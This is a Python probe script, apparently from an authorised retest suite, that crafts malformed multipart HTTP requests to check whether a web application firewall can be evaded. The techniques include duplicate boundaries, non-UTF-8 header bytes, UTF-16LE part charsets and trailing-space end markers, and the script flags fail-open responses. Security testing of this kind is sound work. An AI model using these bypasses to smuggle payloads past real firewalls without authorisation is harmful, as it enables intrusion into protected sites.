#!/usr/bin/env python3
from __future__ import annotations

import argparse
from pathlib import Path

from http_probe_common import dump_json, ensure_dir, parse_url, save_raw_http_artifacts, send_raw_http, write_csv

BOUNDARY = "----TestBoundaryTC27"


def _part(name: bytes, value: bytes, extra_headers: bytes = b"") -> bytes:
    return (
        b"--" + BOUNDARY.encode() + b"\r\n"
        b"Content-Disposition: form-data; name=\"" + name + b"\"\r\n"
        + extra_headers
        + b"\r\n"
        + value
        + b"\r\n"
    )


def _end() -> bytes:
    return b"--" + BOUNDARY.encode() + b"--\r\n"


def _request(host: str, path: str, body: bytes, content_type_override: bytes | None = None) -> bytes:
    ct = content_type_override or (
        b"multipart/form-data; boundary=" + BOUNDARY.encode()
    )
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: RETEST-TC27-MULTIPART\r\n"
        "Connection: close\r\n"
    ).encode()
    headers += b"Content-Type: " + ct + b"\r\n"
    headers += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    headers += b"\r\n"
    return headers + body


def build_cases(host: str, path: str, probe_value: str) -> list[tuple[str, bytes, str]]:
    val = probe_value.encode("utf-8")
    safe_val = b"RETEST-TC27-SAFE"

    # baseline_multipart: normal multipart, safe value (control)
    body_baseline = _part(b"q", safe_val) + _end()
    req_baseline = _request(host, path, body_baseline)

    # duplicate_boundary_param: WAF uses last boundary, backend uses first (or vice versa)
    # Bypass 1 from the article: boundary=real; boundary=fake
    fake_boundary = "----FakeBoundaryTC27"
    body_dup_boundary = (
        b"--" + BOUNDARY.encode() + b"\r\n"
        b"Content-Disposition: form-data; name=\"q\"\r\n\r\n"
        + val + b"\r\n"
        + b"--" + BOUNDARY.encode() + b"--\r\n"
    )
    ct_dup = (
        "multipart/form-data; boundary=" + BOUNDARY + "; boundary=" + fake_boundary
    ).encode()
    req_dup_boundary = _request(host, path, body_dup_boundary, ct_dup)

    # non_utf8_header_byte: 0x88 injected into a Content-Type param — triggers WAF fail-open
    # Bypass 2 from the article: WAF fails when encountering non-UTF8 bytes in any header
    ct_non_utf8 = b"multipart/form-data; boundary=" + BOUNDARY.encode() + b"; x=\x88test"
    body_non_utf8 = _part(b"q", val) + _end()
    req_non_utf8 = _request(host, path, body_non_utf8, ct_non_utf8)

    # garbage_before_boundary: data before the first boundary marker
    # WAF may ignore; backend (RFC 2046) should also ignore — tests whether WAF
    # skips inspection of any content when garbage is present
    body_garbage_before = (
        b"garbage-data-before-boundary\r\n"
        + _part(b"q", val) + _end()
    )
    req_garbage_before = _request(host, path, body_garbage_before)

    # garbage_after_final: data after --boundary--
    # WAF may stop reading at closing boundary and miss a hidden payload after it
    body_garbage_after = (
        _part(b"q", safe_val)
        + b"--" + BOUNDARY.encode() + b"--\r\n"
        + b"hidden-garbage: " + val + b"\r\n"
    )
    req_garbage_after = _request(host, path, body_garbage_after)

    # utf16le_part_charset: nested Content-Type in the multipart part specifies utf-16le
    # Bypass 3: WAF scans raw bytes and misses the pattern; backend decodes via charset
    val_utf16 = probe_value.encode("utf-16le")
    extra_ct = b"Content-Type: text/plain; charset=utf-16le\r\n"
    body_utf16 = _part(b"q", val_utf16, extra_ct) + _end()
    req_utf16 = _request(host, path, body_utf16)

    # duplicate_part_content_type: two Content-Type headers in the same multipart part
    # Bypass 4: WAF uses last (utf-8 → sees nothing), backend uses first (utf-16le → decodes)
    extra_dual_ct = (
        b"Content-Type: text/plain; charset=utf-16le\r\n"
        b"Content-Type: text/plain; charset=utf-8\r\n"
    )
    body_dup_ct = _part(b"q", val_utf16, extra_dual_ct) + _end()
    req_dup_ct = _request(host, path, body_dup_ct)

    # trailing_space_end_marker: closing boundary has trailing space, then attack payload
    # Bypass 5: WAF treats "--boundary-- " as the end marker and stops inspecting;
    # backend may not recognise the malformed closing marker and continues parsing,
    # reading the trailing content as another part or raw body data.
    # Attack value is ONLY in the trailing section — not in any valid part.
    body_trailing = (
        _part(b"q", safe_val)
        + b"--" + BOUNDARY.encode() + b"-- \r\n"
        + val + b"\r\n"
    )
    req_trailing = _request(host, path, body_trailing)

    return [
        ("baseline_multipart",          req_baseline,      "clean multipart, safe value — control"),
        ("duplicate_boundary_param",    req_dup_boundary,  "Bypass1: boundary=real;boundary=fake — WAF/backend boundary disagreement"),
        ("non_utf8_header_byte",        req_non_utf8,      "Bypass2: 0x88 in CT param — fail-open when WAF rejects non-UTF8 headers"),
        ("garbage_before_boundary",     req_garbage_before,"garbage before first boundary marker — WAF pre-boundary inspection check"),
        ("garbage_after_final",         req_garbage_after, "garbage after --boundary-- — WAF post-close inspection check"),
        ("utf16le_part_charset",        req_utf16,         "Bypass3: charset=utf-16le in part — WAF scans raw bytes, backend decodes"),
        ("duplicate_part_content_type", req_dup_ct,        "Bypass4: two CT headers in part — WAF/backend pick different charset"),
        ("trailing_space_end_marker",   req_trailing,      "Bypass5: trailing space in --boundary-- — closing marker recognition gap"),
    ]


def classify_failopen(baseline: dict, variant: dict, case_name: str) -> dict:
    code = variant.get("http_code", "000")
    if code == "000":
        return {"failopen": "false", "failopen_signal": "no-response-connection-drop"}
    if code.startswith("4") or code.startswith("5"):
        return {"failopen": "false", "failopen_signal": f"rejected-{code}"}
    b_code = baseline.get("http_code", "000")
    b_fp = baseline.get("body_fingerprint", "")
    v_fp = variant.get("body_fingerprint", "")
    if code == b_code and v_fp == b_fp:
        signal = "identical-to-baseline"
        if case_name == "non_utf8_header_byte":
            signal = "fail-open-confirmed-non-utf8-passed"
        return {"failopen": "true", "failopen_signal": signal}
    if code == b_code:
        return {"failopen": "true", "failopen_signal": "same-status-different-body-parsing-differential"}
    return {"failopen": "false", "failopen_signal": f"status-{code}-unexpected"}


def main() -> int:
    parser = argparse.ArgumentParser(description="Run TC-27 multipart boundary/field-parsing differential probes.")
    parser.add_argument("--url", required=True)
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--connect-host")
    parser.add_argument("--request-host")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument(
        "--probe-value",
        default="RETEST-TC27-PROBE",
        help="Value inserted into attack-path variants (default is a benign echo marker).",
    )
    args = parser.parse_args()

    out_dir = ensure_dir(args.output_dir)
    scheme, parsed_host, port, path = parse_url(args.url)
    request_host = args.request_host or parsed_host
    connect_host = args.connect_host or parsed_host

    cases = build_cases(request_host, path, args.probe_value)

    baseline_result: dict = {}
    rows: list[dict] = []
    summary: dict = {"url": args.url, "probe_value": args.probe_value, "cases": []}

    for name, request_bytes, description in cases:
        out_prefix = out_dir / name
        response = send_raw_http(
            scheme=scheme,
            connect_host=connect_host,
            port=port,
            request_bytes=request_bytes,
            timeout=args.timeout,
            sni=request_host,
        )
        result = save_raw_http_artifacts(
            out_prefix,
            request_bytes.decode("latin-1", errors="replace"),
            response,
        )
        if name == "baseline_multipart":
            baseline_result = result

        fo = (
            {"failopen": "false", "failopen_signal": "baseline"}
            if name == "baseline_multipart"
            else classify_failopen(baseline_result, result, name)
        )

        row = {
            "case": name,
            "http_code": str(result["http_code"]),
            "server_header": str(result["server_header"]),
            "content_type": str(result["content_type"]),
            "body_fingerprint": str(result["body_fingerprint"]),
            "body_size": str(result["body_size"]),
            "failopen": fo["failopen"],
            "failopen_signal": fo["failopen_signal"],
            "description": description,
            "request_path": str(out_prefix.with_suffix(".request.txt")),
            "raw_response_path": str(result["raw_response_path"]),
        }
        summary["cases"].append(row)
        rows.append(row)

    dump_json(out_dir / "summary.json", summary)
    write_csv(
        out_dir / "summary.csv",
        [
            "case",
            "http_code",
            "server_header",
            "content_type",
            "body_fingerprint",
            "body_size",
            "failopen",
            "failopen_signal",
            "description",
            "request_path",
            "raw_response_path",
        ],
        rows,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
